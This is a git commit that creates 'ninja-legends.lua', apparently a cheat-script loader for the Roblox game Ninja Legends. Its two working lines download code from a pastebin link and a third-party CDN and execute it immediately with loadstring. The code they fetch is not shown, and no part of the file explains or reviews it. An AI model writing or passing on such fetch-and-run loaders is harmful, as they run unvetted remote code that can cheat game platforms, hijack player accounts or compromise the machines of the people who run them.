a7a2a4279f898b86a833da0e8ccf4c0ae3f0a581
Trix <80095537+TrixAde@users.noreply.github.com>
2021-09-05 21:54:43 +0200

    Create ninja-legends.lua

---
+++ ninja-legends.lua
@@ -0,0 +1,3 @@
+pcall(loadstring(game:HttpGet("https://pastebin.com/raw/RjLQKZxZ")))
+-----------------------------------------------------------------------------
+loadstring(game:HttpGet(("https://cdn.julman.fr/scripts/33.lua"), true))()
